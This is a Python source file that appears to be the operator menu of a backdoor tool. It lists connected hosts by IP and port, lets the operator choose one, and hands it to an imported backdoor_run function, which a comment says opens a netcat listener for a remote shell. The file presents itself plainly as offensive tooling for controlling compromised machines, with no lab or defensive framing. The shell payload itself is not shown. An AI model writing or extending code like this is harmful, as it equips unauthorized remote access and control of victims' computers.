from time import sleep
from os import system
from sys import stderr, exit


from tools.backdoor import backdoor_run


def display_menu():
    # display menu
    print("\n\n")
    print("==== Backdoor Main Menu ====")
    print("     ==================     ")
    print("l  --  list connections")
    print("x  --  execute backdoor")
    print("c  --  clear screen")
    print("h  --  display help menu")
    print("q  --  quit program")
    print("====                    ====")


def wait_cmd():
    # wait for a main menu command
    cmd = ""
    while cmd == "":
        cmd = input("[main_menu] >>> ")
    return cmd


def list_connections(addrs):
    # list connected addresses
    i = 0
    print("\n\n")
    print("====  Connections  ====")
    for addr in addrs:
        print("->  %d  --  %s  --  %d  " % (i, addr[0], addr[1]))
        i += 1
    print("====               ====")


def execute_backdoor(cons, addrs, shell_port):
    list_connections(addrs)
    try:
        cmd = wait_cmd()
        cmd = int(cmd)
    except:
        system("clear")
        # retry
        execute_backdoor(cons, addrs, shell_port)
    try:
        conn = cons[cmd]
    except:
        system("clear")
        # retry
        stderr.write("[x] Index out of bounds\n\n")
        execute_backdoor(cons, addrs, shell_port)
    system("clear")
    # open netcat listener and wait for connection
    backdoor_run(conn, shell_port)


def execute_cmd(cons, addrs, cmd, shell_port, status):
    if cmd == "q":
        # quit
        status = 1
    elif cmd == "l":
        # clear screen and list connections
        system("clear")
        list_connections(addrs)
    elif cmd == "c":
        # clear screen
        system("clear")
    elif cmd == "x":
        # start backdoor 
        execute_backdoor(cons, addrs, shell_port)
    else:
        # catch invalid commands
        display_menu()
    return status


def main_menu(cons, addrs, ip_addr, port, shell_port, status=0):
    # this runs the menu once and when status is 1 quits
    # allowing us to refresh the connections if we pass status=1
    display_menu()
    cmd = wait_cmd()
    status = execute_cmd(cons, addrs, cmd, shell_port, status)
    # -- 
    while status != 1:
        cmd = wait_cmd()
        status = execute_cmd(cons, addrs, cmd, shell_port, status)
